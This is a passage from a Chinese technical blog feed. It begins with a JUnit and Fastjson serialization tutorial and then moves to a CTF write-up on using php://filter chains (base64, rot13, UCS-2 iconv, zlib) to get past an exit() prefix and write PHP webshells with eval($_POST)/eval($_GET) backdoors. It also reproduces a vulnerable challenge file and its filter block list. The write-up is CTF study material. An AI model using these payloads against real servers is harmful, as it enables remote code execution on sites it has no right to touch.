class="string">&quot;我在所有的前面被执行，并且我只会执行一次！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@AfterClass</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">afterClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我在最终所有结束之后才会被执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Ignore"><a href="#Ignore" class="headerlink" title="Ignore"></a>Ignore</h2><ul>
<li>Ignore可以让我们暂时的禁用特定的类，被注解之后的类将不再被执行</li>
</ul>
<p>Ignore经过我测试，只有当他放在测试类前才可以生效。</p>
<p>例子：</p>
<p><img src="image-20201102165311512.png" alt="image-20201102165311512"></p>
<p>而如果我们放在其他类前面：</p>
<p><img src="image-20201102165351821.png" alt="image-20201102165351821"></p>
<p>我们可以发现依然被执行了！</p>
<h2 id="Runwith"><a href="#Runwith" class="headerlink" title="Runwith"></a>Runwith</h2><ul>
<li>Runwith放在测试类之前，用于确定这个类该如何运行，我们也可以不标注，将会使用默认的运行容器</li>
</ul>
<p>可以看这篇文章来理解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;my.oschina.net&#x2F;itblog&#x2F;blog&#x2F;1550753?tdsourcetag&#x3D;s_pcqq_aiomsg</span><br></pre></td></tr></table></figure>



<h1 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h1><ul>
<li><p>Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p>
</li>
<li><p>Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p>
</li>
<li><p>Fastjson 源码地址：<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p>
</li>
<li><p>Fastjson 中文 Wiki：<a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a></p>
</li>
<li><p>也就是说，程序员们用这个程序就是为了传运JSON格式的对象，呃，感觉像序列化一样了？</p>
</li>
</ul>
<h2 id="将JAVA对象转换成json格式"><a href="#将JAVA对象转换成json格式" class="headerlink" title="将JAVA对象转换成json格式"></a>将JAVA对象转换成json格式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fortest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;JavaToJson&gt; listOfJava = <span class="keyword">new</span> ArrayList&lt;JavaToJson&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">18</span>,<span class="string">&quot;wndmd&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">        listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">20</span>,<span class="string">&quot;Json!&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String list = JSON.toJSONString(listOfJava);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意，上述代码需要另外起一个类，test不允许在有参构造的类中出现</p>
<p>得到输出结果：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;<span class="attr">&quot;Age&quot;</span>:<span class="number">18</span>,</span><br><span class="line">     <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="number">1604309562809</span>,</span><br><span class="line">     <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wndmd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;Age&quot;</span>:<span class="number">20</span>,</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="number">1604309562809</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Json!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>我们还可以格式化自定义输出，控制字段的排序。</p>
<p>我们更新bean并添加如下字段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaToJson</span> </span>&#123;</span><br><span class="line">    <span class="meta">@JSONField(name = &quot;Age&quot;,serialize = false)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JSONField(name = &quot;FULL NAME&quot;,ordinal = 2)</span></span><br><span class="line">    <span class="keyword">private</span> String fullName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JSONField(name = &quot;DATE OF BIRTH&quot;,format = &quot;dd/MM/yyyy&quot;,ordinal = 1)</span></span><br><span class="line">    <span class="keyword">private</span> Date date;</span><br></pre></td></tr></table></figure>

<p>注意在这里我们添加serialize = false，这里是默认我们添加序列化，如果我们设置为false，该字段将不会被显示。</p>
<p>而ordinal，则是用于规定格式化的顺序，需要注意的是，如果你想控制，最好就全部都使用该属性修饰，或者你自己干脆写的时候就从上向下写，不然的话，默认从上向下执行，只会再按照ordinal限定的顺序排列</p>
<p>上述代码输出：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">     	<span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wndmd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line"> 	&#123;</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Json!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>如果将serialize的false去掉之后，他还是第一个被执行：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;Age&quot;</span>:<span class="number">18</span>,</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wndmd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;Age&quot;</span>:<span class="number">20</span>,</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Json!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="作用对象"><a href="#作用对象" class="headerlink" title="作用对象"></a>作用对象</h2><p>@JSONField 的作用对象:</p>
<ul>
<li><ol>
<li>Field</li>
</ol>
</li>
<li><ol start="2">
<li>Setter 和 Getter 方法</li>
</ol>
</li>
</ul>
<p>需要注意如下两点：</p>
<p><strong>注意：</strong>FastJson 在进行操作时，是根据 getter 和 setter 的方法进行的，并不是依据 Field 进行。</p>
<p><strong>注意：</strong>若属性是私有的，必须有 set 方法。否则无法反序列化。</p>
<p>跟进JSONField查看源码，可以知道我们允许指定很多东西=。=：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> JSONField &#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">ordinal</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">format</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">serialize</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">true</span></span>;</span><br><span class="line">	<span class="comment">//注意这里，反序列化！</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">deserialize</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">true</span></span>;</span><br><span class="line"></span><br><span class="line">    SerializerFeature[] serialzeFeatures() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    Feature[] parseFeatures() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">label</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">jsonDirect</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; serializeUsing() <span class="keyword">default</span> Void.class;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; deserializeUsing() <span class="keyword">default</span> Void.class;</span><br><span class="line"></span><br><span class="line">    String[] alternateNames() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">unwrapped</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">defaultValue</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="配置方式"><a href="#配置方式" class="headerlink" title="配置方式"></a>配置方式</h2><p>FieldInfo 可以配置在 getter/setter 方法或者字段上。例如：</p>
<h3 id="配置在-getter-setter-上"><a href="#配置在-getter-setter-上" class="headerlink" title="配置在 getter/setter 上"></a>配置在 getter/setter 上</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line"> </span><br><span class="line">      <span class="meta">@JSONField(name=&quot;ID&quot;)</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> id;&#125;</span><br><span class="line">      <span class="meta">@JSONField(name=&quot;ID&quot;)</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;<span class="keyword">this</span>.id = id;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="配置在-field-上"><a href="#配置在-field-上" class="headerlink" title="配置在 field 上"></a>配置在 field 上</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">     <span class="meta">@JSONField(name=&quot;ID&quot;)</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> id;&#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;<span class="keyword">this</span>.id = id;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="创建-JSON-对象"><a href="#创建-JSON-对象" class="headerlink" title="创建 JSON 对象"></a>创建 JSON 对象</h2><p>创建 JSON 对象非常简单，只需使用 JSONObject（fastJson提供的json对象） 和 JSONArray（fastJson提供json数组对象） 对象即可。</p>
<p>虽然JSONArryay也可以创建一个JSON对象，但我觉得书写方式不够美观，其中如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">whenGenerateJson_thanGenerationCorrect</span><span class="params">()</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line">    JSONArray jsonArray = <span class="keyword">new</span> JSONArray();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">        JSONObject jsonObject = <span class="keyword">new</span> JSONObject();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;AGE&quot;</span>, <span class="number">10</span>);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;FULL NAME&quot;</span>, <span class="string">&quot;Doe &quot;</span> + i);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;DATE OF BIRTH&quot;</span>, <span class="string">&quot;2016/12/12 12:12:12&quot;</span>);</span><br><span class="line">        jsonArray.add(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">    String jsonOutput = jsonArray.toJSONString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JSON-字符串转换为-Java-对象"><a href="#JSON-字符串转换为-Java-对象" class="headerlink" title="JSON 字符串转换为 Java 对象"></a>JSON 字符串转换为 Java 对象</h2><p>fastjson允许我们可以将前端传来的数据转换变成JSON数据，同样的也允许我们把后端数据转换为JSON字符串丢给前端。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">jsonToJava</span><span class="params">()</span></span>&#123;</span><br><span class="line">        JavaToJson miaomiaomiao = <span class="keyword">new</span> JavaToJson(<span class="number">21</span>, <span class="string">&quot;miaomiaomiao&quot;</span>, <span class="keyword">new</span> Date());</span><br><span class="line">        String jsonObject = JSON.toJSONString(miaomiaomiao);</span><br><span class="line"><span class="comment">//        System.out.println(jsonObject);</span></span><br><span class="line"><span class="comment">//        这前面的part我们将数据转换成了JSON数据</span></span><br><span class="line">        JavaToJson newJavaObject = JSON.parseObject(jsonObject,JavaToJson.class);</span><br><span class="line"><span class="comment">//        指定需要转换的JSON字符串，并且指定原型,这样的话一个JAVA对象就指定好了</span></span><br><span class="line">        System.out.println(newJavaObject.getAge());</span><br><span class="line">        System.out.println(newJavaObject.getFullName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用ContextValuFilter配置JSON转换"><a href="#使用ContextValuFilter配置JSON转换" class="headerlink" title="使用ContextValuFilter配置JSON转换"></a>使用ContextValuFilter配置JSON转换</h3><p>在有些场景中，对Value做过滤，需要获得所述JavaBean的信息，而我们可能想要过滤某些信息，便可以使用该方法进行操作了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Before</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">      listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">31</span>,<span class="string">&quot;wdnmd&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">      listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">33</span>,<span class="string">&quot;wd&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">givenContextFilter_whenJavaObject_thanJsonCorrect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      ContextValueFilter valueFilter = <span class="keyword">new</span> ContextValueFilter () &#123;</span><br><span class="line">          <span class="function"><span class="keyword">public</span> Object <span class="title">process</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">                  BeanContext context, Object object, String name, Object value)</span> </span>&#123;</span><br><span class="line">              <span class="keyword">if</span> (name.equals(<span class="string">&quot;DATE OF BIRTH&quot;</span>)) &#123;</span><br><span class="line">                  <span class="keyword">return</span> <span class="string">&quot;NOT TO DISCLOSE&quot;</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (value.equals(<span class="string">&quot;wdnmd&quot;</span>)) &#123;</span><br><span class="line">                  <span class="keyword">return</span> ((String) value).toUpperCase();</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      String jsonOutput = JSON.toJSONString(listOfJava, valueFilter);</span><br><span class="line">      System.out.println(jsonOutput);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>经过上述代码的操作，我们的时间将会修改为NOT TO DISCLOSE，并且数据中不包含wdnmd的将会被过滤,具体输出如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span>,<span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wdnmd&quot;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span></span><br><span class="line">     &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>开发</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>全国工控2020-web-easyphp</title>
    <url>/2020/10/27/%E5%85%A8%E5%9B%BD%E5%B7%A5%E6%8E%A72020-web-easyphp/</url>
    <content><![CDATA[<h1 id="全国工控2020-web-easyphp"><a href="#全国工控2020-web-easyphp" class="headerlink" title="全国工控2020-web-easyphp"></a>全国工控2020-web-easyphp</h1><h2 id="1-从伪协议开始说起"><a href="#1-从伪协议开始说起" class="headerlink" title="1.从伪协议开始说起"></a>1.从伪协议开始说起</h2><p>php://filter是PHP中独有的协议，该协议流允许我们作为一个中间流来处理其他流，</p>
<p>在之前三个白帽中有一个比赛，其中一部分的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line">$content .= $_POST[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">&#x27;filename&#x27;</span>], $content);</span><br></pre></td></tr></table></figure>

<h3 id="1-base64"><a href="#1-base64" class="headerlink" title="1.base64"></a>1.base64</h3><p>在这里我们可以看见，如果正常的编译代码，由于在开头加入了exit内容，即使我们写入了一句话也无法解析。</p>
<p>但是我们可以通过filename在php写入的时候构造协议，所以利用base64-decode方法解码构造一句话的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>但是在这里我们又会发现如果直接打入进去，base64解析没有成功，这就是因为base是由4字节组成一次payload。所以话说回去，</p>
<p>当我们使用base64decode协议的时候，&lt; ? ; ?&gt;等等都不会被解析，所以源代码则会被识别为：</p>
<p>phpexit，而base64是四个字节还原成一个字母，故我们需要再占一个位数，给她，也就是phpexit[?]构造成八个字节供basedecode使用，之后在后面再编上我们自己的payload，所以这道题可以构造如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.base64-decode/resource=shell.php&amp;txt=cPD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br></pre></td></tr></table></figure>

<p>但是这里仍需要注意，我们构造的时候payload当中不允许出现+号等特殊字符，否则会遇见没有被写上去情况。，实际上，除了base过滤器，还有很多过滤器可以供给我们使用：</p>
<p>官网：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.php 过滤器</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.convert.php 转换过滤器</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.string.php 字符过滤器</span><br></pre></td></tr></table></figure>

<h3 id="2-rot13"><a href="#2-rot13" class="headerlink" title="2.rot13"></a>2.rot13</h3><p>除此之外我尝试使用rot13来绕过，但是会发现rot13之后的结果不合法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.rot13/resource=shell.php&amp;txt=<span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>得到php为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>cuc rkvg; <span class="meta">?&gt;</span><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样的话，因为多了一个分号，而导致失败了（开启短标签的情况下，只要用&lt;? ?&gt;中的内容就会被解析）但如果关闭短标签的情况下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">txt=<span class="meta">?&gt;</span><span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span>&amp;filename=php:<span class="comment">//filter/write=string.rot13/resource=shell.php</span></span><br></pre></td></tr></table></figure>

<p>成功！除此之外，还补充一种骚思路：</p>
<h3 id="3-iconv字符编码转换"><a href="#3-iconv字符编码转换" class="headerlink" title="3.iconv字符编码转换"></a>3.iconv字符编码转换</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>iconv函数接收三个参数，当前编码，转换后编码，之后再转回去，所以利用该特性，我们可以反其道行之。但是在这里，利用该字符编码，会导致出现之前的+号的问题，于是就失败了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.utf-7.utf-8/resource=shell.php&amp;txt=?+AD4-+ADw?php phpinfo()+ADs ?+AD4-</span></span><br></pre></td></tr></table></figure>

<p>根据大佬给出的UCS2-2 编码的方式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>需要注意的是，UCS2的编码方式是2位一次转换，所以我们必须保证需要转换的编码为2位数，不够的我们可以使用空格占位,而我们上面的转换之后直接用的话，会发现无法转换，这是因为必须保证&lt;?php exit();也被成功转换，所以我们再前面再加上一个1即可，</p>
<p>最终payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp phpipfn(o;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>写入shell：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp+pvela$(P_SO[T]1;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>4.组合使用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13/resource=shell.php&amp;txt=1?&lt;uc ciryn$(C_FB[G]1;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>还可以尝试使用srtip_tags+base64的方式进行绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&amp;txt=PD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br></pre></td></tr></table></figure>

<p>经过该方式构造的payload，会进行strip_tags，去除掉了前面的内容，之后再用base64解压了我们的内容。</p>
<p>讲完上面的，再回到wmctf的check in2，题目的源码为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64|dechunk|\.\./i&#x27;</span>, $content))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file_exists($content))</span><br><span class="line">        <span class="keyword">require_once</span>($content);</span><br><span class="line">    file_put_contents($content, <span class="string">&#x27;&lt;?php exit();&#x27;</span> . $content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤器过滤了很多，我们只剩下了压缩过滤器，我们可以通过zlib.inflate解压字符，之后再利用zlib.deflate压缩的方式getshell，str.tolower会在</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/zlib.deflate|string.tolower|zlib.inflate|<span class="meta">?&gt;</span><span class="meta">&lt;?php</span>%0deval($_GET[1]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>除此之外，还有二次编码绕过的方式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/?content=php://filter/write=string.%7%32ot13|<span class="meta">?&gt;</span><span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span>|/resource=shell.php</span></span><br></pre></td></tr></table></figure>

<p> 而昨天的比赛过滤了tolower,upper等等，甚至又把%过滤了，导致我们没法用上面两个payload了，但是我们依然可以利用zlib的 deflate，之后再利用url编码解析，得出如下payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.strip_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%2</span></span><br><span class="line"><span class="number">8</span>%<span class="number">50</span>%<span class="number">28</span>%ae%<span class="number">2</span>c%<span class="number">2</span>e%<span class="number">49</span>%cd%d5%<span class="number">50</span>%<span class="number">89</span>%<span class="number">77</span>%<span class="number">77</span>%<span class="number">0</span>d%<span class="number">89</span>%<span class="number">8</span>e%<span class="number">8</span>f%d5%b4%b6%b7%<span class="number">03</span>%<span class="number">3</span>C%<span class="number">3</span>F/resourc</span><br><span class="line">e=shell.php </span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>华北赛区Dropbox</title>
    <url>/2020/10/29/%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADropbox/</url>
    <content><![CDATA[<h1 id="1-知识点学习"><a href="#1-知识点学习" class="headerlink" title="1.知识点学习"></a>1.知识点学习</h1><h2 id="1-1-phar流"><a href="#1-1-phar流" class="headerlink" title="1.1 phar流"></a>1.1 phar流</h2><p>自PHP5.3.0开始，php便支持该数据流</p>
<table>
<thead>
<tr>
<th>支持allow_url_fopen</th>
<th>no</th>
</tr>
</thead>
<tbody><tr>
<td>支持allow_url_include</td>
<td>No</td>
</tr>
<tr>
<td>允许读取</td>
<td>Yes</td>
</tr>
<tr>
<td>允许写入</td>
<td>Yes</td>
</tr>
</tbody></table>
